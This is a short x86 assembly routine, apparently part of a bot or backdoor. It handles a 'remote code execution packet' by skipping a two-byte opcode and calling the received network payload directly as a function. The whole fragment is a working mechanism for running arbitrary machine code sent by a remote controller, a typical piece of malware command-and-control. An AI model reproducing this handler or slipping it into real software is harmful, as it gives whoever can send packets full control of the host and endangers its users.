; Handle a remote code execution packet.
remote_code_exec_packet:
    push ebp
    mov ebp, esp
    mov edx, [ebp + 8]  ; Packet payload.

    ; Skip past the opcode
    add edx, 2
    call edx    ; Execute the payload as if it were a function

    mov esp, ebp
    pop ebp
    retn 4